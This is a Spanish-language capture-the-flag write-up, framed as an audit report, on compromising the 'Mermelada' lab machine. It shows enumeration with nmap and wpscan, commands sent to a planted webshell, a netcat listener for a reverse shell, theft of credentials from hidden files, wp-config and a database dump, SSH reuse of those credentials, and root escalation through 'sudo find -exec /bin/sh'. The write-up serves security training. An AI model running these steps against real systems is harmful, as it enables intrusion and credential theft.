# Reporte de Auditoría de Seguridad: Conquistando la Máquina Mermelada

**Fecha de la Auditoría:** 1 de julio de 2026  
**Sistema Operativo Objetivo:** Debian Linux  
**Plataforma / Laboratorio:** TheHackersLabs  

---

## 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos y Servicios (Nmap)
Se ejecutó un escaneo inicial con detección de versiones y scripts por defecto para mapear la superficie de ataque expuesta por el servidor objetivo.

```bash
nmap -p- --open -sCV -v <IP_OBJETIVO>
```

**Resultados obtenidos:**
*   **Puerto 22/tcp:** Abierto | `OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)`
*   **Puerto 80/tcp:** Abierto | `Apache httpd 2.4.65 ((Debian))`
    *   *Título HTTP:* `Mermelada`
    *   *Dirección MAC:* `08:00:27:EA:CA:1B` (Entorno virtualizado Oracle VirtualBox)

---

## 2. Fase de Enumeración Web y Descubrimiento

### Fuzzing Web (Descubrimiento de Directorios)
Un ataque de diccionario (*fuzzing*) sobre el servicio web expuesto en el puerto 80 reportó las siguientes rutas de interés:
*   `/login.php`
*   `/wordpress/wp-login.php` (Evidencia la presencia del CMS WordPress)

### Enumeración Especializada de WordPress (WPScan)
Se utilizó la herramienta `wpscan` para identificar usuarios, plugins vulnerables y temas expuestos en la instancia de WordPress encontrada:

```bash
wpscan --url http://<IP_OBJETIVO>/wordpress -e u vp vt
```

**Hallazgos clave:**
*   Se identificó el directorio expuesto `/wordpress/wp-content/uploads/`.
*   Dentro de la estructura de cargas (*uploads*), se localizó un archivo comprometido que permitía la ejecución remota de comandos (RCE) mediante parámetros HTTP.

---

## 3. Acceso Inicial e Infiltración

### Ejecución de Comandos Remotos (RCE)
Se validó la vulnerabilidad interactuando con la webshell descubierta en el directorio de cargas enviando el parámetro `cmd`:

```text
URL: http://<IP_OBJETIVO>/wordpress/wp-content/uploads/path/to/webshell.php?cmd=id
Respuesta: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Establecimiento de Shell Reversa
Desde la máquina atacante se levantó un oyente Netcat:
```bash
nc -lvnp 9000
```
Se forzó la ejecución de una solicitud de shell reversa desde el servidor web hacia el puerto del atacante para recibir la terminal interactiva de `www-data`.

### Estabilización de la Terminal (Tratamiento TTY)
Para operar con total interactividad, evitar desconexiones accidentales y usar funciones como el autocompletado (`Tab`) y atajos de teclado (`Ctrl+C`), se aplicó el procedimiento documentado en la bitácora técnica de referencia:
*   **Manual utilizado:** [Tratamiento y Estabilización de TTY](https://github.com/kaleth4/Tratamiento-y-Estabilizaci-n-de-TTY)

---

## 4. Post-Explotación y Enumeración Local

### Hallazgo de Credenciales en Archivos Ocultos
Durante la inspección del directorio `/opt` como el usuario `www-data`, se localizó un archivo de texto oculto con permisos de lectura general:

```bash
ls -la /opt
cat /opt/.credenciales
```

**Credenciales expuestas encontradas (Archivo `.credenciales`):**
*   **Usuario Base de Datos:** `wwwuser`
*   **Contraseña Base de Datos:** `micontraseña`

### Extracción del Archivo de Configuración de WordPress
Se revisó el archivo principal de configuración de la aplicación web en `/var/www/html/wordpress/wp-config.php` filtrando por sentencias de definición:

```bash
cat wp-config.php | grep define -i
```

**Credenciales maestras de base de datos extraídas:**
*   `DB_NAME`: `mermelada`
*   `DB_USER`: `root`
*   `DB_PASSWORD`: `12345`

---

## 5. Exfiltración de Datos (Movimiento Lateral)

### Volcado de la Base de Datos MariaDB
Aprovechando que la contraseña del administrador de la base de datos (`root`) estaba expuesta en texto claro, se accedió a la consola interactiva de la base de datos local:

```bash
mysql -uroot -p12345
```

Se realizaron consultas SQL para extraer la información almacenada en los esquemas del sistema:

```sql
show databases;
use mermelada;
show tables;
-- Extracción de registros de la tabla personalizada 'users'
select * from users;
```

**Registro de Credenciales de Sistema obtenido:**
*   **Usuario:** `mermeladita`
*   **Contraseña:** `pepitU`

### Intrusión de Sistema vía SSH
Se utilizaron las nuevas credenciales del sistema para saltar de contexto desde la shell web restringida de `www-data` a una sesión de usuario válida en la máquina mediante SSH:

```bash
ssh mermeladita@<IP_OBJETIVO>
# Contraseña introducida: pepitU
```

**Éxito:** Al acceder al directorio de trabajo personal (`/home/mermeladita`), se procedió a abrir la primera bandera del CTF (`user.txt`).

---

## 6. Escalada de Privilegios Final

### Verificación de Privilegios de Sudo
Se inspeccionaron los binarios que el usuario `mermeladita` podía ejecutar con privilegios elevados sin ingresar contraseña:

```bash
sudo -l
```

**Configuración vulnerable encontrada:**
```text
User mermeladita may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

El usuario actual tiene la facultad de ejecutar el comando `/usr/bin/find` como superusuario sin credenciales (`NOPASSWD`).

### Explotación de GTFOBins (`find`)
Dado que `find` cuenta con el argumento `-exec` para procesar archivos mediante llamadas del sistema, se abusó de este privilegio para invocar de forma forzada una shell Bourne (`sh`) bajo el contexto de `root`:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

### Acceso Máximo y Cierre del CTF
El indicador de comando cambió de manera inmediata al carácter `#`, confirmando el éxito de la explotación. Se navegó hacia el directorio exclusivo de administración para leer la flag definitiva:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat *
```

**Mensaje del Sistema de Flag de Root:**
```text
------------------------------------------------------------------------------------------------
[-] Felicidades! Has logrado vulnerar la máquina con éxito.
------------------------------------------------------------------------------------------------
Recuerda que el objetivo de este CTF es el aprendizaje. Si algo no salió a la primera, investiga, prueba y vuelve a intentarlo.

Salud ^^
```

¡Máquina **Mermelada** completamente comprometida y finalizada con éxito! 🍯🚀
